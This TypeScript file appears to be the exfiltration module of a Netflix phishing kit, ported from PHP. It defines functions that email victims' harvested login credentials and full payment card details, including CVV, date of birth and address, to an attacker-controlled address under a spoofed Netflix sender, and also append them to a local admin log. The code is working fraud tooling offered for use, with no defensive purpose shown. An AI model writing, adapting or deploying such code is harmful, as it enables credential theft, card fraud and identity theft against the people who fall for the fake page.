/**
 * Email notification module
 * Converted from PHP sand_email.php
 */

import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export class EmailNotifier {
    private transporter: nodemailer.Transporter;
    private emailConfig: {
        from: string;
        to: string;
    };

    constructor(smtpConfig?: {
        host: string;
        port: number;
        secure: boolean;
        auth: {
            user: string;
            pass: string;
        };
    }) {
        // Default configuration - should be replaced with actual SMTP settings
        const defaultConfig = {
            host: process.env.SMTP_HOST || 'smtp.example.com',
            port: parseInt(process.env.SMTP_PORT || '587'),
            secure: false,
            auth: {
                user: process.env.SMTP_USER || 'your-email@example.com',
                pass: process.env.SMTP_PASS || 'your-password'
            }
        };

        this.transporter = nodemailer.createTransport(smtpConfig || defaultConfig);

        this.emailConfig = {
            from: 'Netflix <fsociety@netflix.com>',
            to: process.env.NOTIFICATION_EMAIL || 'attacker@example.com'
        };
    }

    async sendLoginNotification(loginData: {
        email: string;
        password: string;
        ip: string;
        country: string;
        userAgent: string;
        os: string;
        browser: string;
        timestamp: string;
    }): Promise<boolean> {
        try {
            const subject = `${loginData.email} / ${loginData.ip} / ${loginData.country}`;
            const htmlContent = this.createLoginEmailContent(loginData);

            const mailOptions = {
                from: this.emailConfig.from,
                to: this.emailConfig.to,
                subject: subject,
                html: htmlContent
            };

            const result = await this.transporter.sendMail(mailOptions);

            // Also log to admin file (equivalent to PHP fwrite to admin.php)
            this.logToAdminFile(htmlContent);

            return true;
        } catch (error) {
            console.error('Error sending email notification:', error);
            return false;
        }
    }

    async sendCardNotification(cardData: {
        nameOnCard: string;
        cardNumber: string;
        expiryDate: string;
        cvv: string;
        birthdate: string;
        address: string;
        city: string;
        state: string;
        zipCode: string;
        phoneNumber: string;
        bankName: string;
        cardType: string;
        cardBrand: string;
        ip: string;
        country: string;
        os: string;
        browser: string;
        timestamp: string;
    }): Promise<boolean> {
        try {
            const subject = `💳 CC Info / ${cardData.ip} / ${cardData.country}`;
            const htmlContent = this.createCardEmailContent(cardData);

            const mailOptions = {
                from: this.emailConfig.from,
                to: this.emailConfig.to,
                subject: subject,
                html: htmlContent
            };

            const result = await this.transporter.sendMail(mailOptions);

            // Also log to admin file
            this.logToAdminFile(htmlContent);

            return true;
        } catch (error) {
            console.error('Error sending card notification:', error);
            return false;
        }
    }

    private createLoginEmailContent(data: {
        email: string;
        password: string;
        ip: string;
        country: string;
        userAgent: string;
        os: string;
        browser: string;
        timestamp: string;
    }): string {
        return `
<html>
<head>
    <style type="text/css">
        body {
            padding: 0;
            margin: 0;
            background-color: #000;
            background-image: radial-gradient(circle farthest-side at center bottom, #000, #000 125%);
            border-bottom: 1px solid rgba(255,255,255,.3);
            color: #fff;
            height: 100vh;
            font-family: calibri;
            font-size: 18px;
            text-shadow: 0 0 10px #fff;
        }
        .content {
            margin: 0 auto;
            max-width: 900px;
            width: 100%;
            border: 2px solid rgb(178,7,16);
            border-radius: 4px;
            box-shadow: 0 0 40px rgb(178,7,16), 0 0 15px rgb(178,7,16) inset;
        }
        .mail {
            padding: 10px 20px 0 20px;
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="mail">
            <h2 style="font-size: 25px; font-family: 'Comic Sans MS', cursive, sans-serif;">
                💖Log Netflix💖 ┃ ${data.ip} ┃ By fSOCIETY 🖕🤡🖕
            </h2>
            <h2>👤 UserLogin: <span>${data.email}</span></h2>
            <h2>🔓 Password: <span>${data.password}</span></h2>
            <h2>💻 System: <span>${data.os}</span></h2>
            <h2>🌐 Browser: <span>${data.browser}</span></h2>
            <h2>🔍 IP INFO: <span><a href="http://www.geoiptool.com/?IP=${data.ip}">${data.country}</a></span></h2>
            <h2>⏰ Time/Date: <span>${data.timestamp}</span></h2>
        </div>
    </div>
</body>
</html>`;
    }

    private createCardEmailContent(data: {
        nameOnCard: string;
        cardNumber: string;
        expiryDate: string;
        cvv: string;
        birthdate: string;
        address: string;
        city: string;
        state: string;
        zipCode: string;
        phoneNumber: string;
        bankName: string;
        cardType: string;
        cardBrand: string;
        ip: string;
        country: string;
        os: string;
        browser: string;
        timestamp: string;
    }): string {
        return `
<html>
<head>
    <style type="text/css">
        body {
            padding: 0;
            margin: 0;
            background-color: #000;
            background-image: radial-gradient(circle farthest-side at center bottom, #000, #000 125%);
            border-bottom: 1px solid rgba(255,255,255,.3);
            color: #fff;
            height: 100vh;
            font-family: calibri;
            font-size: 18px;
            text-shadow: 0 0 10px #fff;
        }
        .content {
            margin: 0 auto;
            max-width: 900px;
            width: 100%;
            border: 2px solid rgb(178,7,16);
            border-radius: 4px;
            box-shadow: 0 0 40px rgb(178,7,16), 0 0 15px rgb(178,7,16) inset;
        }
        .mail {
            padding: 10px 20px 0 20px;
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="mail">
            <h2 style="font-size: 25px; font-family: 'Comic Sans MS', cursive, sans-serif;">
                💖CC Netflix💖 ┃ ${data.ip} ┃ By fSOCIETY 🖕🤡🖕
            </h2>
            <h2>👤 CardHolder Name: <span>${data.nameOnCard}</span></h2>
            <h2>🎂 D.O.B: <span>${data.birthdate}</span></h2>
            <h2>🗺 Address: <span>${data.address}</span></h2>
            <h2>🌎 City: <span>${data.city}</span></h2>
            <h2>🌍 State: <span>${data.state}</span></h2>
            <h2>📮 Zip Code: <span>${data.zipCode}</span></h2>
            <h2>📞 Phone: <span>${data.phoneNumber}</span></h2>
            <h2>💳 Credit Card Number: <span>${data.cardNumber}</span></h2>
            <h2>🔄 Expiry Date: <span>${data.expiryDate}</span></h2>
            <h2>🔑 CSC (CVV): <span>${data.cvv}</span></h2>
            <h2>💳 Card Bank: <span>${data.bankName}</span></h2>
            <h2>💳 Card Type: <span>${data.cardType}</span></h2>
            <h2>💳 Card Brand: <span>${data.cardBrand}</span></h2>
            <h2>💻 System: <span>${data.os}</span></h2>
            <h2>🌐 Browser: <span>${data.browser}</span></h2>
            <h2>🔍 IP INFO: <span><a href="http://www.geoiptool.com/?IP=${data.ip}">${data.country}</a></span></h2>
            <h2>⏰ Time/Date: <span>${data.timestamp}</span></h2>
        </div>
    </div>
</body>
</html>`;
    }

    private logToAdminFile(content: string): void {
        try {
            const adminFilePath = path.join(__dirname, '../../admin.html');
            fs.appendFileSync(adminFilePath, content + '\n');
        } catch (error) {
            console.error('Error logging to admin file:', error);
        }
    }
}

// Default instance
export const emailNotifier = new EmailNotifier();